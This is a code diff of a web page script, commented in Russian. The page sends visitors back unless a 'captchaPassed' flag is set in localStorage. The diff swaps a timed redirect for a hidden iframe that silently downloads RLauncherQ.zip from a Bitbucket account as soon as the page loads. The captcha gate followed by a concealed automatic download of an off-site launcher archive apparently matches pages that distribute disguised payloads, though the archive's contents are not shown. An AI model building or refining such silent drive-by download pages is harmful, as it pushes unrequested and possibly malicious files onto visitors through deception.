@@ -32,19 +32,18 @@
     }
   </style>
   <script>
-    // Если флаг проверки отсутствует, перенаправляем на index.html
+    // Проверка флага. Если пользователь не прошёл проверку, перенаправляем обратно на index.html.
     if (localStorage.getItem('captchaPassed') !== 'true') {
       window.location.href = "index.html";
-    } else {
-      // Можно удалить флаг, если требуется одноразовый доступ
-      // localStorage.removeItem('captchaPassed');
     }
     
-    // Автоматически начинаем загрузку файла через секунду после загрузки страницы
+    // При загрузке создаём скрытый iframe для запуска загрузки файла,
+    // чтобы содержимое страницы оставалось видимым.
     window.onload = function() {
-      setTimeout(function() {
-        window.location.href = "https://bitbucket.org/launchercd5/download/downloads/RLauncherQ.zip";
-      }, 1000);
+      var iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = "https://bitbucket.org/launchercd5/download/downloads/RLauncherQ.zip";
+      document.body.appendChild(iframe);
     };
   </script>
 </head>
